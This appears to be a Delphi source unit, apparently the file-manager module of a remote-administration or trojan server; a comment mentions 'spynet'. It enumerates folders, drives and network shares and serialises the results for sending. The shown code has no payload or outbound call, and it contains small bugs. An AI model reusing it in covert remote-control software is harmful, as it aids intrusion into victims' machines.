unit UnitFileManager;

interface

uses
  windows;

function ListarArquivos(RealDir: string): string;
function GetDrives: String;
Function TipoArquivo(const p_File: String; Extensao: shortstring; IsFolder: boolean = false): shortString;
function ListSharedFolders: string;

implementation

uses
  UnitServerUtils,
  UnitDiversos,
  UnitCryptString,
  ShellApi,
  StreamUnit;

type
  RecordResult = record
    Find: TWin32FindData;
    TipoDeArquivo: shortString;
end;

type
  ExtensionFileType = record
    Ext: string[4];
    ExtType: shortString;
  end;

var
  EFT: array[0..99] of ExtensionFileType;

Function TipoArquivo(const p_File: String; Extensao: shortstring; IsFolder: boolean = false): shortString;
var
  v_Inf: TSHFileInfo;
  i: integer;
begin
  Extensao := UpperString(Extensao);

  if IsFolder = true then
  begin
    result := EFT[0].ExtType;
    exit;
  end;

  for i := 0 to high(EFT) do
  begin
    if upperstring(EFT[i].Ext) = Extensao then
    begin
      result := EFT[i].ExtType;
      exit;
    end;
  end;

  if SHGetFileInfo(PChar(p_File), 0, v_Inf, Sizeof(v_Inf), SHGFI_TYPENAME) <> 0 then
  begin
    Result := shortstring(v_Inf.szTypeName);

    for i := 0 to high(EFT) do if EFT[i].Ext = '' then
    begin
      EFT[i].Ext := Extensao;
      EFT[i].ExtType := result;
      exit;
    end;
  end else
  begin
    if length(Extensao) > 1 then
    begin
      Delete(Result, 1, 1);
      Result := Result + ' File';

      for i := 0 to high(EFT) do if EFT[i].Ext = '' then
      begin
        if Extensao <> '' then
        begin
          EFT[i].Ext := Extensao;
          EFT[i].ExtType := result;
          exit;
        end;
      end;
    end else Result := ' ';
  end;
end;

function EnumFuncLAN(NetResource: PNetResource; ItemIndex: integer): string;
var
  Enum: THandle;
  Count, BufferSize: DWORD;
  Buffer: array[0..16384 div SizeOf(TNetResource)] of TNetResource;
  i: Integer;
begin
  result := '';

  if WNetOpenEnum(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, 0, NetResource, Enum) = NO_ERROR then
  try
    Count := $FFFFFFFF;
    BufferSize := SizeOf(Buffer);
    while WNetEnumResource(Enum, Count, @Buffer, BufferSize) = NO_ERROR do
    for i := 0 to Count - 1 do
    begin
      case ItemIndex of
        0:
        begin {Network Machines}
          if Buffer[i].dwType = RESOURCETYPE_ANY then
          Result := Result + Buffer[i].lpRemoteName + '|' + '7' + '|'; // numeração (7, 8, 9) usada no spynet
        end;
        1:
        begin {Shared Drives}
          if Buffer[i].dwType = RESOURCETYPE_DISK then
          Result := Result + Buffer[i].lpRemoteName + '|' + '8' + '|';
        end;
        2:
        begin {Printers}
          if Buffer[i].dwType = RESOURCETYPE_PRINT then
          Result := Result + Buffer[i].lpRemoteName + '|' + '9' + '|';
        end;
      end;
      if (Buffer[i].dwUsage and RESOURCEUSAGE_CONTAINER) > 0 then
      Result := Result + EnumFuncLan(@Buffer[i], 1);
    end;
    finally
    WNetCloseEnum(Enum);
  end;
end;

function ListSharedFolders: string;
begin
  result := EnumFuncLAN(nil, 1);
end;

function GetDrives: String;
var
  pDrive: PChar;
  Formato: array[0..MAX_PATH] of char;
  MaxPath, Flags: DWord;
begin
  Result := '';
  GetMem(pDrive, 512);
  GetLogicalDriveStrings(512, pDrive);
  SetErrorMode(SEM_FAILCRITICALERRORS);
  while pDrive^ <> #0 do
  begin
    Result := Result + pDrive + '|' + IntToStr(GetDriveType(pDrive)) + '|';
    Inc(pDrive, 4);
  end;
end;

function ListarArquivos(RealDir: string): string;
var
  ToSend, TempStrDir, TempStrFiles: string;
  H: THandle;
  Find: TWin32FindData;

  ResultStreamDir: TMemoryStream;
  ResultStreamFiles: TMemoryStream;
  RR: RecordResult;
begin
  result := '';

  if RealDir = '%WIN%' then RealDir := MyWindowsFolder else
  if RealDir = '%SYS%' then RealDir := MySystemFolder else
  if RealDir = '%RECENT%' then RealDir := GetShellFolder('Recent') + '\' else
  if RealDir = '%DESKTOP%' then RealDir := GetShellFolder('Desktop') + '\';
  if length(RealDir) < 3 then RealDir := MyrootFolder;

  if directoryexists(RealDir) = false then
  begin
    result := '';
    exit;
  end;
  ResultStreamDir := TMemoryStream.Create;
  ResultStreamFiles := TMemoryStream.Create;

  H:=0;
  try
    H := FindFirstFile(PChar(RealDir + '*.*'), Find);
    if H <> DWORD(-1) then
    while FindNextFile(H, Find) do
    begin
      RR.Find := Find;

      if Find.dwFileAttributes and $00000010 <> 0 then
      begin
        RR.TipoDeArquivo := EFT[0].ExtType;
        ResultStreamDir.WriteBuffer(RR, sizeof(RecordResult));
      end else
      begin
        RR.TipoDeArquivo := TipoArquivo(RealDir + string(Find.cFileName), ExtractFileExt(string(Find.cFileName)));
        ResultStreamFiles.WriteBuffer(RR, sizeof(RecordResult));
      end;
    end;
    finally windows.FindClose(H);
  end;

  TempStrDir := StreamToStr(ResultStreamDir);
  TempStrFiles := StreamToStr(ResultStreamFiles);

  ResultStreamDir.Free;
  ResultStreamFiles.Free;

  result := RealDir + '|' + TempStrDir + TempStrFiles;
end;

procedure AdicionarTypeDir;
var
  v_Inf: TSHFileInfo;
begin
  SHGetFileInfo(PChar(MyTempFolder), 0, v_Inf, Sizeof(v_Inf), SHGFI_TYPENAME);
  EFT[0].Ext := 'FDIR';
  EFT[0].ExtType := shortstring(v_Inf.szTypeName);
end;

initialization
  AdicionarTypeDir;

end.
